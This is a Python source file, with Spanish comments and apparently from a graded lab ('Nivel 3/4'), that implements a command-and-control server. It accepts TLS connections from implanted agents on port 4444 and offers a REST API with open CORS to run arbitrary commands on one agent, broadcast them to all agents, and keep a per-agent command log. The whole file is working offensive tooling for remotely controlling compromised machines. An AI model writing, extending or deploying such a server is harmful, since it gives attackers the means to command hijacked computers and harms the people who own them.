import socket
import ssl
import threading
import time
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

app = FastAPI(title="C2 Server - Nivel 3/4")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── ESTADO GLOBAL ────────────────────────────────────────────────────────────
agentes = {}   # { id: { "conn": ssl_socket, "addr": str, "os": str, "connected_at": str } }
historial = {} # { id: [ { "cmd": str, "result": str, "timestamp": str } ] }
counter = 0
lock = threading.Lock()


# ─── SOCKET SERVER CON TLS (puerto 4444) ──────────────────────────────────────

def handle_agent(conn, addr, agente_id):
    print(f"[+] Agente {agente_id} conectado desde {addr}")

    try:
        os_info = conn.recv(1024).decode(errors="replace").strip()
    except:
        os_info = "desconocido"

    with lock:
        agentes[agente_id] = {
            "conn": conn,
            "addr": str(addr),
            "os": os_info,
            "connected_at": time.strftime("%H:%M:%S")
        }
        historial[agente_id] = []

    try:
        while True:
            time.sleep(1)  # ← mantiene el hilo vivo sin consumir el socket
    except:
        pass
    finally:
        with lock:
            agentes.pop(agente_id, None)
        conn.close()
        print(f"[-] Agente {agente_id} desconectado")


def socket_server():
    global counter

    # Contexto TLS — Nivel 3
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain("server.crt", "server.key")

    raw_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    raw_server.bind(("0.0.0.0", 4444))
    raw_server.listen(20)

    server = context.wrap_socket(raw_server, server_side=True)
    print("[*] Servidor C2 escuchando en puerto 4444 (TLS)")

    while True:
        try:
            conn, addr = server.accept()
            counter += 1
            agente_id = counter
            t = threading.Thread(target=handle_agent, args=(conn, addr, agente_id))
            t.daemon = True
            t.start()
        except Exception as e:
            print(f"[!] Error aceptando conexión: {e}")


# ─── API REST (puerto 8000) ────────────────────────────────────────────────────

class Comando(BaseModel):
    agente_id: int
    cmd: str


@app.get("/")
def root():
    return {"status": "C2 activo", "agentes_conectados": len(agentes)}


@app.get("/agentes")
def listar_agentes():
    return {
        "total": len(agentes),
        "agentes": [
            {
                "id": aid,
                "addr": info["addr"],
                "os": info["os"],
                "connected_at": info["connected_at"]
            }
            for aid, info in agentes.items()
        ]
    }


@app.post("/ejecutar")
def ejecutar(payload: Comando):
    with lock:
        info = agentes.get(payload.agente_id)
    if not info:
        return {"error": f"Agente {payload.agente_id} no conectado"}
    try:
        conn = info["conn"]
        conn.send((payload.cmd + "\n").encode())
        conn.settimeout(10)
        resultado = conn.recv(65536).decode(errors="replace")
        conn.settimeout(None)

        # Guarda en historial
        with lock:
            historial[payload.agente_id].append({
                "cmd": payload.cmd,
                "result": resultado,
                "timestamp": time.strftime("%H:%M:%S")
            })

        return {"agente_id": payload.agente_id, "resultado": resultado}
    except Exception as e:
        return {"error": str(e)}


@app.post("/broadcast")
def broadcast(payload: Comando):
    """Nivel 4 — envía un comando a TODOS los agentes conectados"""
    resultados = {}
    with lock:
        ids = list(agentes.keys())
    for aid in ids:
        r = ejecutar(Comando(agente_id=aid, cmd=payload.cmd))
        resultados[aid] = r
    return {"broadcast": resultados}


@app.get("/historial/{agente_id}")
def ver_historial(agente_id: int):
    """Nivel 4 — historial de comandos por agente"""
    return {"agente_id": agente_id, "historial": historial.get(agente_id, [])}


# ─── MAIN ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    t = threading.Thread(target=socket_server)
    t.daemon = True
    t.start()
    uvicorn.run(app, host="0.0.0.0", port=8000)
